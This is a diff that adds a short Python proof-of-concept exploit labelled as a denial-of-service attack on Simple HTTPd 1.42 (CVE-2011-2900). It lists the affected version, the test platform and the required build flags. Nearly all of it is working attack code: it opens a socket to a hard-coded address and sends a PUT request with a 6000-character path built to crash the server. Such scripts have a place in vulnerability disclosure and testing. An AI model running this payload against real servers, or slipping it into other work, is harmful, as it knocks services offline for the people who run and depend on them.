@@ -1,0 +1,29 @@
+#!/usr/bin/python
+# Exploit Title: Simple HTTPd 1.42 PoC DoS
+# Date: 8/10/2011
+# Author: G13
+# Software Link: 
+http://sourceforge.net/projects/shttpd/files/shttpd/1.42/shttpd-1.42.tar.gz/download
+# Version: 1.42
+# Tested on: WinXP SP1
+# CVE : 2011-2900
+#
+# Since Mongoose HTTPd and Simple HTTPd share similar code, the exploit 
+still works.
+# Simple HTTPd is still affected by the bug. The executable must be 
+compiled with -DNO_AUTH and -D_DEBUG enabled. I compiled
+# under MinGW.
+
+import socket, sys
+
+
+buf = "A" * 6000
+
+s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(('192.168.1.101',80))
+
+s.send("PUT /" + buf + "/ HTTP/1.0\r\n")
+s.send("\r\n")
+print s.recv(1024)
+s.close()
+
